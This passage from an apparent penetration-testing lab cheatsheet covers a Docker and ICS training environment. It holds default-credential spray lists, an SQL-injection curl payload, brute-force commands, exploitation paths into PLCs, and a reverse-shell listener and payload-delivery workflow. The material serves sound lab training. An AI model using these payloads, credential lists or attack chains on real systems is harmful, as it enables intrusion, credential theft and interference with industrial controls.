| Web Portal | 172.16.40.10 | HTTP:80,443 | Servers |
| DB Server | 172.16.40.20 | MySQL:3306 | Servers |
| LDAP Server | 172.16.40.30 | LDAP:389,636 | Servers |
| Mail Server | 172.16.40.40 | SMTP:25, IMAP:143 | Servers |

#### ICS Network - Service IPs

| Service | IP Address | Services | Zone |
|---------|------------|----------|------|
| Historian | 192.168.1.10 | HTTP:80, PI:5450 | DMZ |
| HMI Server | 192.168.1.20 | HTTP:80, VNC:5900 | DMZ |
| Eng Workstation | 192.168.1.50 | SSH:22 | DMZ |
| Jump Server | 192.168.1.100 | SSH:22, RDP:3389 | DMZ |
| SCADA Master | 192.168.100.10 | Modbus:502, DNP3:20000 | OT |
| PLC-1 | 192.168.100.20 | Modbus:502, S7:102 | OT |
| PLC-2 | 192.168.100.21 | Modbus:502, E/IP:44818 | OT |
| RTU-1 | 192.168.100.30 | Modbus:502, DNP3:20000 | OT |
| Field HMI | 192.168.100.40 | HTTP:80, VNC:5900 | OT |
| Safety PLC | 192.168.200.10 | Modbus:502 | Safety |

---

## 5. Attack Surface Quick Reference

### 5.1 Docker Lab - Services per Host

#### DMZ Network Attack Surface

| Host | Open Ports | Services | Attack Vectors |
|------|------------|----------|----------------|
| vulnerable-web | 80, 443 | HTTP/HTTPS | SQLi, XSS, Auth bypass, Dir enum |
| ftp-server | 21, 30000-30009 | FTP | Anon access, Brute force, Banner grab |
| smtp-server | 25, 587 | SMTP | VRFY/EXPN, Relay abuse, Auth brute |
| dns-server | 53 | DNS | Zone transfer, Subdomain enum |

#### Internal Network Attack Surface

| Host | Open Ports | Services | Attack Vectors |
|------|------------|----------|----------------|
| smb-server | 139, 445 | SMB | Null session, Share enum, Brute force |
| mysql-server | 3306 | MySQL | Auth brute, UDF exploit, SQLi |
| workstation-1 | - | - | Lateral movement target |
| workstation-2 | - | - | Lateral movement target |
| server-1 | 22 | SSH | Auth brute, Key theft |
| dc01 | - | AD | Kerberos, LDAP enum |

---

### 5.2 Known Vulnerabilities Reference

#### Docker Lab Vulnerabilities

| Service | Vulnerability | CVE/Type | Severity |
|---------|--------------|----------|----------|
| Web App | SQL Injection | CWE-89 | Critical |
| Web App | Default credentials | CWE-798 | High |
| Web App | Directory traversal | CWE-22 | High |
| FTP | Anonymous access | CWE-284 | Medium |
| FTP | Weak credentials | CWE-521 | High |
| SMTP | Open relay | CWE-284 | Medium |
| SMTP | VRFY user enum | CWE-200 | Medium |
| DNS | Zone transfer | CWE-200 | Medium |
| SMB | Null session | CWE-284 | Medium |
| SMB | Guest access | CWE-284 | Medium |
| MySQL | Weak root password | CWE-521 | Critical |

#### CORE Network Vulnerabilities

| Topology | Host | Vulnerability | Notes |
|----------|------|---------------|-------|
| Corporate | backup-server | Anonymous FTP | Backup files exposed |
| Corporate | web-server | Hardcoded creds | In config files |
| Corporate | mail-server | SMTP VRFY | User enumeration |
| Small Business | nas-backup | Default creds | admin/admin |
| Small Business | file-server | Open shares | Sensitive data |
| University | web-portal | Hardcoded creds | In config.php |
| University | dns-server | Zone transfer | Full domain dump |
| University | ldap-server | Anonymous bind | User enumeration |
| ICS | hmi-server | No VNC auth | Full access |
| ICS | field-hmi | Default creds | Default web login |
| ICS | scada-master | No Modbus auth | Protocol weakness |

---

### 5.3 Default Credentials Reference

#### Universal Defaults (Try These First)

| Username | Passwords to Try |
|----------|------------------|
| admin | admin, admin123, password, administrator |
| root | root, toor, r00t, password |
| user | user, user123, password |
| test | test, test123, testing |

#### Service-Specific Defaults

| Service | Username | Password | Notes |
|---------|----------|----------|-------|
| FTP | anonymous | (any) | If anonymous enabled |
| FTP | ftp | ftp | Legacy default |
| MySQL | root | (empty) | Default install |
| PostgreSQL | postgres | postgres | Common default |
| MongoDB | - | - | No auth by default |
| Redis | - | - | No auth by default |
| SSH | root | root | Weak systems |
| VNC | - | (empty) | No password |
| Tomcat | tomcat | tomcat | Manager interface |
| Tomcat | admin | admin | Manager interface |
| Grafana | admin | admin | Web interface |
| Jenkins | admin | admin | Web interface |

#### Docker Lab Specific Credentials

| Service | Username | Password | Target |
|---------|----------|----------|--------|
| Web | admin | admin123 | Login form |
| FTP | ftpuser | ftppass123 | FTP auth |
| SMTP | smtpuser | smtppass123 | SMTP auth |
| SMB | smbuser | smbpass123 | SMB auth |
| MySQL | webuser | webpass123 | DB access |
| MySQL | root | rootpass123 | Full access |
| SSH | admin | admin123 | server-1 |
| DC | Administrator | AdminPass123! | AD admin |

---

### 5.4 Exploitation Paths

#### Path 1: DMZ to Internal (Docker Lab)

```
[Attacker] -> [vulnerable-web] -> [mysql-server] -> [Internal Network]
         |           |                   |
         |    Port: 8080/80        Port: 3306
         |    Attack: SQLi          Creds: webuser/webpass123
         |                               |
         +-------------------------------+
                Pivot via DB creds
```

#### Path 2: Anonymous Access Chain

```
[Attacker] -> [ftp-server] -> [smb-server] -> [Sensitive Data]
         |         |               |
    Port: 2121    Anon access   Null session
    Find: creds   Download       Enum shares
```

#### Path 3: Corporate Network Compromise

```
[External] -> [web-server] -> [db-server] -> [backup-server] -> [Internal]
         |          |              |               |
    HTTP:80    Config files   MySQL creds     FTP backups
    SQLi       hardcoded      lateral mov     data exfil
```

#### Path 4: ICS Attack Chain

```
[Corporate] -> [jump-server] -> [eng-workstation] -> [scada-master] -> [PLC]
          |           |                |                  |
      RDP:3389    Pivot point     Credentials         Modbus:502
      Creds        SSH tunnel     stolen              No auth
```

---

## 6. Troubleshooting Commands

### 6.1 Connectivity Testing

#### Basic Network Tests

```bash
# Ping test (from host)
ping -c 3 10.10.10.10

# Ping test (from container)
docker exec cptc11-attack-platform ping -c 3 10.10.10.10

# TCP port check
nc -zv 10.10.10.10 80

# TCP port check with timeout
nc -zv -w 3 10.10.10.10 80

# UDP port check
nc -zvu 10.10.10.40 53

# Traceroute
traceroute 10.10.20.60

# MTR (continuous traceroute)
mtr 10.10.20.60
```

#### DNS Resolution Tests

```bash
# Basic DNS lookup
nslookup testlab.local 10.10.10.40

# Detailed DNS query
dig @10.10.10.40 testlab.local ANY

# Reverse DNS lookup
dig @10.10.10.40 -x 10.10.10.10

# Zone transfer test
dig @10.10.10.40 testlab.local AXFR

# Using custom port (Docker)
dig @127.0.0.1 -p 5353 testlab.local
```

#### Service-Specific Connection Tests

```bash
# HTTP test
curl -v http://localhost:8080

# HTTPS test (ignore cert)
curl -vk https://localhost:8443

# FTP test
curl -v ftp://localhost:2121

# SMTP test
nc -v localhost 2525

# MySQL test
mysql -h 127.0.0.1 -P 3307 -u webuser -pwebpass123

# SMB test
smbclient -L //localhost -p 4445 -N
```

---

### 6.2 Service Verification

#### Docker Service Status

```bash
# Check all container status
docker-compose ps

# Check specific container logs
docker-compose logs vulnerable-web

# Check if service is listening inside container
docker exec cptc11-vulnerable-web netstat -tlnp

# Check if service is listening (alternative)
docker exec cptc11-vulnerable-web ss -tlnp

# Test service from inside container
docker exec cptc11-attack-platform curl http://10.10.10.10
```

#### Port Verification

```bash
# List all listening ports (host)
netstat -tlnp
# or
ss -tlnp

# Check specific port
lsof -i :8080

# List Docker port mappings
docker ps --format "table {{.Names}}\t{{.Ports}}"

# Check container port bindings
docker port cptc11-vulnerable-web
```

#### Service Health Checks

```bash
# HTTP service health
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080

# FTP banner grab
echo "QUIT" | nc localhost 2121

# SMTP banner grab
echo "QUIT" | nc localhost 2525

# MySQL version check
mysql -h 127.0.0.1 -P 3307 -u webuser -pwebpass123 -e "SELECT VERSION();"

# SMB share listing
smbclient -L //localhost -p 4445 -U smbuser%smbpass123
```

---

### 6.3 Log Locations

#### Docker Container Logs

| Container | Log Command |
|-----------|-------------|
| All containers | `docker-compose logs` |
| Web app | `docker-compose logs vulnerable-web` |
| FTP | `docker-compose logs ftp-server` |
| SMTP | `docker-compose logs smtp-server` |
| DNS | `docker-compose logs dns-server` |
| SMB | `docker-compose logs smb-server` |
| MySQL | `docker-compose logs mysql-server` |

#### Common Log Paths Inside Containers

| Service | Log Path |
|---------|----------|
| Apache | /var/log/apache2/access.log |
| Apache | /var/log/apache2/error.log |
| Nginx | /var/log/nginx/access.log |
| Nginx | /var/log/nginx/error.log |
| vsftpd | /var/log/vsftpd.log |
| Postfix | /var/log/mail.log |
| BIND | /var/log/named/named.log |
| Samba | /var/log/samba/log.smbd |
| MySQL | /var/log/mysql/error.log |
| SSH | /var/log/auth.log |

#### Accessing Container Logs

```bash
# View Apache access log
docker exec cptc11-vulnerable-web cat /var/log/apache2/access.log

# Tail logs in real-time
docker exec cptc11-vulnerable-web tail -f /var/log/apache2/access.log

# View auth failures
docker exec cptc11-server-1 grep "Failed" /var/log/auth.log

# Search for errors
docker exec cptc11-mysql-server grep -i error /var/log/mysql/error.log
```

---

### 6.4 Common Issues and Solutions

#### Container Won't Start

```bash
# Check for errors
docker-compose logs <service-name>

# Check container status
docker inspect cptc11-<service-name> --format='{{.State.Status}}'

# Rebuild container
docker-compose build --no-cache <service-name>
docker-compose up -d <service-name>
```

#### Network Connectivity Issues

```bash
# Verify network exists
docker network ls

# Inspect network
docker network inspect docker_dmz_network

# Check container is on network
docker inspect cptc11-attack-platform --format='{{json .NetworkSettings.Networks}}'

# Reconnect container to network
docker network connect docker_dmz_network cptc11-attack-platform
```

#### Port Conflicts

```bash
# Find process using port
lsof -i :8080
# or
netstat -tlnp | grep 8080

# Kill process using port
kill $(lsof -t -i :8080)

# Change port in docker-compose.yml and restart
docker-compose down
docker-compose up -d
```

#### DNS Resolution Fails

```bash
# Test DNS directly
dig @127.0.0.1 -p 5353 testlab.local

# Check DNS container is running
docker-compose ps dns-server

# Restart DNS service
docker-compose restart dns-server

# Check DNS configuration
docker exec cptc11-dns-server cat /etc/bind/named.conf
```

#### Full Environment Reset

```bash
# Complete reset
cd /Users/ic/cptc11/docker
docker-compose down -v
docker system prune -f
docker-compose build --no-cache
docker-compose up -d

# Verify all services
docker-compose ps
```

---

## 7. Quick Attack Workflows

### 7.1 Initial Reconnaissance Workflow

```bash
# Step 1: Host Discovery
python3 /Users/ic/cptc11/python/tools/network-scanner/tool.py 10.10.10.0/24 -o hosts.json

# Step 2: Port Scan Live Hosts
python3 /Users/ic/cptc11/python/tools/port-scanner/tool.py 10.10.10.10 --ports top100 --banner

# Step 3: Service Fingerprinting
python3 /Users/ic/cptc11/python/tools/service-fingerprinter/tool.py 10.10.10.10 --ports 80,443 --aggressive

# Step 4: DNS Enumeration
python3 /Users/ic/cptc11/python/tools/dns-enumerator/tool.py testlab.local -n localhost:5353 -z

# Step 5: SMB Enumeration
python3 /Users/ic/cptc11/python/tools/smb-enumerator/tool.py localhost --port 4445
```

### 7.2 Credential Attack Workflow

```bash
# Step 1: Test Default Credentials
python3 /Users/ic/cptc11/python/tools/credential-validator/tool.py localhost \
    --protocol ftp --port 2121 -u admin -P admin123

# Step 2: Brute Force with Credential File
python3 /Users/ic/cptc11/python/tools/credential-validator/tool.py localhost \
    --protocol ftp --port 2121 -c creds.txt --stop-on-success

# Step 3: Test Credential Reuse
python3 /Users/ic/cptc11/python/tools/credential-validator/tool.py localhost \
    --protocol http-basic --port 8080 --http-path /admin -u admin -P admin123

# Step 4: Crack Found Hashes
python3 /Users/ic/cptc11/python/tools/hash-cracker/tool.py <hash> -w wordlist.txt
```

### 7.3 Web Application Attack Workflow

```bash
# Step 1: Directory Enumeration
python3 /Users/ic/cptc11/python/tools/web-directory-enumerator/tool.py http://localhost:8080 -v

# Step 2: Check robots.txt
curl http://localhost:8080/robots.txt

# Step 3: Test Authentication
python3 /Users/ic/cptc11/python/tools/credential-validator/tool.py localhost \
    --protocol http-form --port 8080 --http-path /login.php \
    --http-user-field username --http-pass-field password \
    --http-success "Welcome" -c creds.txt

# Step 4: Check for SQL Injection
# Manual testing with common payloads
curl "http://localhost:8080/login.php" -d "username=admin'--&password=x"
```

### 7.4 Payload Delivery Workflow

```bash
# Step 1: Start Listener
python3 /Users/ic/cptc11/python/tools/reverse-shell-handler/tool.py -l 4444 &

# Step 2: Generate Payload
python3 /Users/ic/cptc11/python/tools/payload-generator/payload_generator.py \
    --type reverse_shell --lang python --lhost 10.10.10.100 --lport 4444

# Step 3: Encode if Needed
python3 /Users/ic/cptc11/python/tools/shellcode-encoder/shellcode_encoder.py \
    -i payload.bin -e xor -f python

# Step 4: Deploy and Execute
# Upload via web shell, FTP, or SMB
# Execute on target system
```

---

## Quick Reference Cards

### Network Scanning Quick Card

```
+------------------------------------------------------------------+
|                    NETWORK SCANNING QUICK CARD                   |
+------------------------------------------------------------------+
| DISCOVERY:                                                       |
|   nmap -sn 10.10.10.0/24              # Ping sweep               |
|   nmap -sn -PS22,80,443 10.10.10.0/24 # TCP SYN discovery        |
|                                                                  |
| PORT SCAN:                                                       |
|   nmap -sV -sC 10.10.10.10            # Service detection        |
|   nmap -p- --min-rate 1000 10.10.10.10 # Full port scan          |
|   nmap -sU -p 53,161,500 10.10.10.10  # UDP scan                 |
|                                                                  |
| SERVICE ENUM:                                                    |
|   nmap --script=vuln 10.10.10.10      # Vulnerability scan       |
|   nmap --script=smb* 10.10.10.10      # SMB scripts              |
+------------------------------------------------------------------+
```

### Credential Testing Quick Card

```
+------------------------------------------------------------------+
|                  CREDENTIAL TESTING QUICK CARD                   |
+------------------------------------------------------------------+
| FTP:                                                             |
|   ftp 10.10.10.20                     # Interactive              |
|   curl ftp://user:pass@10.10.10.20    # Command line             |
|                                                                  |
| SSH:                                                             |
|   ssh user@10.10.10.10                # Interactive              |
|   sshpass -p 'password' ssh user@host # Scripted                 |
|                                                                  |
| SMB:                                                             |
|   smbclient -L //host -U user%pass    # List shares              |
|   smbclient //host/share -U user%pass # Connect                  |
|                                                                  |
| MySQL:                                                           |
|   mysql -h host -u user -p            # Interactive              |
|   mysql -h host -u user -pPASSWORD    # Command line             |
|                                                                  |
| HTTP:                                                            |
|   curl -u user:pass http://host/admin # Basic auth               |
|   curl -d "user=x&pass=y" http://host # Form auth                |
+------------------------------------------------------------------+
```

### Docker Commands Quick Card

```
+------------------------------------------------------------------+
|                    DOCKER COMMANDS QUICK CARD                    |
+------------------------------------------------------------------+
| LIFECYCLE:                                                       |
|   docker-compose up -d                # Start all                |
|   docker-compose down                 # Stop all                 |
|   docker-compose down -v              # Stop + remove volumes    |
|   docker-compose restart              # Restart all              |
|                                                                  |
| MONITORING:                                                      |
|   docker-compose ps                   # Status                   |
|   docker-compose logs -f              # Follow logs              |
|   docker stats                        # Resource usage           |
|                                                                  |
| ACCESS:                                                          |
|   docker exec -it <container> bash    # Shell access             |
|   docker exec <container> <cmd>       # Run command              |
|                                                                  |
| NETWORK:                                                         |
|   docker network ls                   # List networks            |
|   docker network inspect <net>        # Network details          |
+------------------------------------------------------------------+
```

### IP Address Quick Card

```
+------------------------------------------------------------------+
|                    IP ADDRESS QUICK CARD                         |
+------------------------------------------------------------------+
| DOCKER LAB:                                                      |
|   DMZ:        10.10.10.0/24  (GW: 10.10.10.1)                    |
|   Internal:   10.10.20.0/24  (GW: 10.10.20.1)                    |
|   Management: 10.10.30.0/24  (GW: 10.10.30.1)                    |
|                                                                  |
| KEY TARGETS:                                                     |
|   Web:      10.10.10.10 / localhost:8080                         |
|   FTP:      10.10.10.20 / localhost:2121                         |
|   SMTP:     10.10.10.30 / localhost:2525                         |
|   DNS:      10.10.10.40 / localhost:5353                         |
|   SMB:      10.10.20.50 / localhost:4445                         |
|   MySQL:    10.10.20.60 / localhost:3307                         |
|   Attacker: 10.10.10.100                                         |
|                                                                  |
| CORE CORPORATE:                                                  |
|   DMZ:      10.100.1.0/24                                        |
|   Internal: 10.100.2.0/24                                        |
|   Database: 10.100.3.0/24                                        |
+------------------------------------------------------------------+
```

### Credentials Quick Card

```
+------------------------------------------------------------------+
|                    CREDENTIALS QUICK CARD                        |
+------------------------------------------------------------------+
| DOCKER LAB - COMMON CREDENTIALS:                                 |
|   admin:admin123       (Web, FTP, SMTP, SMB)                     |
|   root:rootpass123     (MySQL root)                              |
|   webuser:webpass123   (MySQL app user)                          |
|   ftpuser:ftppass123   (FTP)                                     |
|   smtpuser:smtppass123 (SMTP)                                    |
|   smbuser:smbpass123   (SMB)                                     |
|   backup:backup2024    (FTP, SMB)                                |
|   anonymous:(any)      (FTP if enabled)                          |
|                                                                  |
| SSH TARGETS:                                                     |
|   admin:admin123       (srv01)                                   |
|   sysadmin:sysadmin1   (srv01)                                   |
|   root:r00t            (srv01)                                   |
|                                                                  |
| DOMAIN:                                                          |
|   Administrator:AdminPass123!  (DC01)                            |
|   Domain_Admin:DomAdmin2024    (DC01)                            |
+------------------------------------------------------------------+
```

---

## Document Information

| Field | Value |
|-------|-------|
| Version | 1.0 |
| Last Updated | January 2026 |
| Author | CPTC Training Team |
| Target Audience | All skill levels |
| Related Documents | tool-commands-cheatsheet.md, network-scanning-cheatsheet.md |

---

*This cheatsheet is for authorized security testing and educational purposes only. All credentials and vulnerabilities are intentionally configured in isolated lab environments.*
